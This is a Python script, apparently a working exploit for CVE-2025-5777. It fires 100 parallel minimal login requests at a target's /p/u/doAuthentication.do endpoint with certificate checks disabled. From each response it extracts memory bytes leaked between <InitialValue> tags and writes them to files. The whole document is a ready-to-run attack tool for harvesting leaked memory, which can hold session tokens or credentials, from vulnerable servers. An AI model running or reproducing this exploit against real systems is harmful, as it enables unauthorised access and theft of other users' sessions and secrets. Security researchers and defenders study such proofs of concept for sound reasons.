#!/usr/bin/env python3
"""
CVE-2025-5777
--------------------------------
Posts a minimal authentication request and verifies whether the target leaks
the raw bytes placed between `<InitialValue>` … `</InitialValue>` tags.  Any
captured bytes are written to disk for analysis.

Usage
    python CVE-2025-5777.py <target.host>
"""

import base64
import re
import sys
import threading
import warnings
from pathlib import Path

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning


# ---------- helpers ----------------------------------------------------------

TAG_OPEN  = b"<InitialValue>"
TAG_CLOSE = b"</InitialValue>"
EXTRACT_RE = re.compile(re.escape(TAG_OPEN) + b"(.*?)" + re.escape(TAG_CLOSE),
                        flags=re.DOTALL | re.IGNORECASE)

USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/118.0.0.0b Safari/537.36 "
)

BASE_HEADERS = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": USER_AGENT,
}


def extract_initial_value(blob: bytes) -> bytes | None:
    """Return the bytes between the first <InitialValue> … </InitialValue> pair, or None."""
    m = EXTRACT_RE.search(blob)
    return None if m is None else m.group(1)


def save_binary(data: bytes, target: str, idx: int) -> Path:
    """Write *data* to <target>_<idx>.bin and return its Path."""
    fname = Path(f"{target.replace('.', '_')}_{idx}.bin")
    fname.write_bytes(data)
    return fname


# ---------- worker -----------------------------------------------------------


def fetch_and_extract(target: str, thread_idx: int) -> None:
    url = f"https://{target}/p/u/doAuthentication.do"

    try:
        resp = requests.post(
            url,
            data=b"login",                 # minimal body
            headers=BASE_HEADERS,
            timeout=10,
            verify=False,                  # self-signed certs are fine
        )
        resp.raise_for_status()
    except Exception as e:
        print(f"[{target}] HTTP error in thread {thread_idx}: {e}")
        return

    binary = extract_initial_value(resp.content)
    if binary is None:
        print(f"[{target}] No <InitialValue> tag found (thread {thread_idx})")
        return

    fpath = save_binary(binary, target, thread_idx)
    print(
        f"[{target}] thread {thread_idx}: extracted {len(binary)} bytes -> "
        f"{binary[:32].hex()}…  (saved to {fpath})"
    )


# ---------- main -------------------------------------------------------------


def main() -> None:
    if len(sys.argv) != 2:
        sys.exit(f"Usage: {sys.argv[0]} <target.host>")

    target = sys.argv[1]

    threads = [
        threading.Thread(target=fetch_and_extract, args=(target, i))
        for i in range(100)
    ]
    for t in threads:
        t.start()
    for t in threads:
        t.join()


if __name__ == "__main__":
    # suppress the noisy SSL warning produced by verify=False
    warnings.simplefilter("ignore", InsecureRequestWarning)
    main()
